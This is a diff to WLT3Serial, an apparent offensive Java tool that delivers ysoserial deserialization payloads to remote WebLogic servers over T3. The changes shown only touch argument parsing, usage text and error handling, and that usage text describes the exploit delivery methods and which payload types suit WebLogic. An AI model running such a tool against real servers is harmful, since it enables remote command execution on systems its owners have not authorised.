@@ -57,6 +57,8 @@ public class WLT3Serial {
 						case "--help": //print usage
 							usage();
 							return;
+						case "--verbose":
+							break;
 						case "--method=Property":
 							method = "Property";
 							methSet = true;
@@ -114,7 +116,7 @@ public class WLT3Serial {
 		//check validity of inputted ysoserial payload type, and generate ysoserial payload
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if(payloadClass == null) {
-			System.err.println("Error: Invalid payload type \""+payloadType+"\", check Usage (-h/--help) for available payload types");
+			System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial jar file is in classpath, and check Usage (--help) for available payload types!");
 			return;
 		}
 		final ObjectPayload payload = payloadClass.newInstance();
@@ -136,12 +138,13 @@ public class WLT3Serial {
 	
 	//print Usage information
 	private static void usage() {
-		System.err.println("Usage: WLT3Serial.jar [OPTIONS] REMOTE_HOST REMOTE_PORT PAYLOAD_TYPE PAYLOAD_CMD");
+		System.err.println("Usage: WLT3Serial [OPTIONS] REMOTE_HOST REMOTE_PORT PAYLOAD_TYPE PAYLOAD_CMD");
 		System.err.println("\nOptions:");
 		System.err.println("\t--help\t\t\t\tprint usage (you\'re lookin at it)\n");
+		System.err.println("\t--verbose\t\t\tVerbose output (including full thrown exceptions) (NOT YET IMPLEMENTED)\n");
 		System.err.println("\t--method=EXPLOIT_METHOD\t\tMethod for delivering ysoserial payload:");
 		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, similar to JavaUnserializeExploits weblogic.py)");
-		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind())");
+		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), also similar to JavaUnserializeExploits weblogic.py)");
 		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)\n");
 		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
 		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2 (Default)");
@@ -149,11 +152,17 @@ public class WLT3Serial {
 		System.err.println("\t\t\t(Note: SSLv2 and SSLv3 are unsupported at this time.)\n\n");
 		
 		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" types):");
-		final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
-		Collections.sort(payloadClasses, new Strings.ToStringComparator());
-		for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
-			System.err.println("\t"+payloadClass.getSimpleName());
+		try {
+			final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
+			Collections.sort(payloadClasses, new Strings.ToStringComparator());
+			for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
+				System.err.println("\t"+payloadClass.getSimpleName());
+			}
+			System.err.println("");
+		} catch(NoClassDefFoundError ncdfe) {
+			System.err.println("\tNo ysoserial object payload classes found! Ensure that ysoserial jar file is in classpath when executing WLT3Serial!\n");
+		} catch(Exception e) {
+			System.err.println("\tUnknown Error occurred while listing ysoserial object payload classes ("+e.getClass().getName()+")!");
 		}
-		System.err.println("");
 	}
 }
